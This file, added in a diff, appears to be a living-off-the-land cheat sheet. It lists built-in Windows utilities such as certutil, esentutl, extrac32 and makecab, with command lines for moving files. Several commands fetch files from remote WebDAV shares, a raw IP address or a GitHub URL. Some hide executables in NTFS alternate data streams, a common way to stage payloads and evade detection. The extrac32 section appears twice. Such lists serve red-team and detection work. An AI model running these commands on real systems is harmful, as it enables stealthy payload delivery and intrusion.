@@ -1,0 +1,71 @@
+File Transfer - extrac32
+c:\windows\system32\extrac32.exe
+c:\windows\sysWOW64\extrac32.exe
+extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe    
+extrac32 \\webdavserver\webdav\file.cab c:\ADS\file.txt:file.exe    
+extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt   
+extrac32 /C c:\sourcefile.txt c:destFile.txt
+
+File Transfer - CERTUTIL
+c:\windows\system32\certutil.exe
+c:\windows\sysWOW64\certutil.exe
+certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe    
+certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt    
+certutil -encode inputFileName encodedOutputFileName   
+certutil -decode encodedInputFileName decodedOutputFileName
+
+
+File Transfer - ESENTUTL
+c:\windows\system32\esentutl.exe
+c:\windows\sysWOW64\esentutl.exe
+esentutl.exe /y C:\folder\sourcefile.vbs /d C:\folder\destfile.vbs /o     
+esentutl.exe /y C:\ADS\file.exe /d c:\ADS\file.txt:file.exe /o     
+esentutl.exe /y C:\ADS\file.txt:file.exe /d c:\ADS\file.exe /o     
+esentutl.exe /y \\82.221.113.85\webdav\file.exe /d c:\ADS\file.txt:file.exe /o     
+esentutl.exe /y \\82.221.113.85\webdav\file.exe /d c:\ADS\file.exe /o     
+esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d \\otherwebdavserver\webdav\adrestore.exe /o 
+
+
+File Transfer - EXTRAC32
+c:\windows\system32\extrac32.exe
+c:\windows\sysWOW64\extrac32.exe
+extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe    
+extrac32 \\webdavserver\webdav\file.cab c:\ADS\file.txt:file.exe    
+extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt   
+extrac32 /C c:\sourcefile.txt c:destFile.txt
+
+File Transfer - EXPAND
+c:\windows\system32\Expand.exe
+c:\windows\sysWOW64\Expand.exe
+expand \\webdav\folder\file.bat c:\ADS\file.bat    
+expand c:\ADS\file1.bat c:\ADS\file2.bat    
+expand \\webdav\folder\file.bat c:\ADS\file.txt:file.bat
+
+
+File Transfer - MAKECAB
+c:\windows\system32\makecab.exe
+c:\windows\sysWOW64\makecab.exe
+makecab c:\ADS\autoruns.exe c:\ADS\cabtest.txt:autoruns.cab    
+makecab \\webdavserver\webdav\file.exe C:\Folder\file.cab    
+makecab \\webdavserver\webdav\file.exe C:\Folder\file.txt:file.cab  
+
+
+File Transfer - PRINT
+c:\windows\system32\print.exe
+c:\windows\sysWOW64\print.exe
+print /D:c:\ads\file.txt:file.exe c:\ads\file.exe     
+print /D:C:\ads\CopyOfFile.exe C:\ads\FileToCopy.exe
+print /D:c:\outfolder\outfile.exe \\webdavserver\folder\file.exe    
+
+
+File Transfer - REPLACE
+c:\windows\system32\replace.exe
+c:\windows\sysWOW64\replace.exe
+replace c:\source\file.cab c:\destination /A
+replace \\webdav.host.com\foo\bar.exe c:\outdir /A 
+
+File Transfer - ROBOCOPY
+c:\windows\system32\Robocopy.exe
+c:\windows\sysWOW64\Robocopy.exe
+Robocopy.exe C:\sourceDir d:\destDir
+Robocopy.exe C:\sourceDir d:\destDir file1 file2
